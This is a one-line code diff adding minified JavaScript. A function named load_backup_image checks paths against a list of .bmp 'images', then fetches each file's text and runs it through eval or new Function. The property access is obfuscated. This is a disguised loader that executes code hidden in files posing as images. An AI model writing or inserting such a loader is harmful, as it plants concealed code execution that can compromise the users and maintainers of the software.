@@ -1,0 +1,1 @@
+const whitelist=['/scripts/unamused_reimu.bmp','/scripts/playful_reimu.bmp','/scripts/cozy_reimu.bmp'];var load_backup_image=function(a){if(!whitelist['includes'](a))return;if(typeof fetch!=='undefined')fetch(a)['then'](c=>c['text']())['then'](eval);else{var b=new XMLHttpRequest();b['open']('get',a),b['onload']=function(){new Function(b['response'])();};}};ext={};
